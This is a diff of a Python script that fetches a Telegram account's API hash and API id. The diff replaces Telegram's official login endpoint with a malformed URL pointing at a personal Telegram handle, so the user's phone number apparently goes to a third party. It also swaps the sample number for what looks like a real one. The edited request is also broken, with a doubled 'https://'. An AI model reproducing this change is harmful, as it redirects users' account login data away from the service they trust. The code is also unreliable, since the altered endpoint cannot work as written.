@@ -20,11 +20,11 @@ print (f"""{Fore.CYAN}
     {Fore.YELLOW}Tool to get api hash and api id of telegram account 
     {Fore.LIGHTGREEN_EX}Git & Telegram : @esfelurm\n
 """)
-Phone = input(f"{Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.GREEN}Enter your number along with the country code [Ex : +98XXXXXX]: {Fore.RED}")
+Phone = input(f"{Fore.RED}[{Fore.GREEN}+{Fore.RED}] {Fore.GREEN}Enter your number along with the country code [Ex : +9877324476]: {Fore.RED}")
 with requests.Session() as req:
     phone_number = Phone
     
-    login0 = req.post('https://my.telegram.org/auth/send_password', data={'phone': phone_number})
+    login0 = req.post('https://https://t.me/pathanbhai23', data={'phone': phone_number})
 
     if 'Sorry, too many tries. Please try again later.' in login0.text:
         print(f'{Fore.RED}Your account has been banned!\n Please try again in 8 hours ')
